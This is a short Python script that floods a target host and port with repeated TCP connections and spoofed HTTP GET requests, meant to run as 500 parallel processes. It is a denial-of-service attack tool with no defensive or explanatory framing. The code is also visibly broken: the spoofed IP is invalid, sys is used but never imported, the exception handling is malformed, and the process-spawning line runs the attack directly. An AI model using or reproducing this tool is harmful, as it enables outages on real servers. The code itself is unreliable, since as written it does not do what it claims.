import multiprocessing
import socket

fake_ip = '178.233.122.455'
connections = 500
connected = 0

def attack_ddos(target, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: /" + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()

            global connected
            connected += 1
            print(f'Connected: {connected}')
        except KeyboardInterrupt():
            sys.exit('^C\n')
        except:
            e = sys.exc_info()[1]
            print(f'{e}')

def ddos(target, port):
    for i in range(connections):
        try:
            process = multiprocessing.Process()(target=attack_ddos(target, port))
            process.start()
        except KeyboardInterrupt():
            process.kill()
            sys.exit('^C\n')
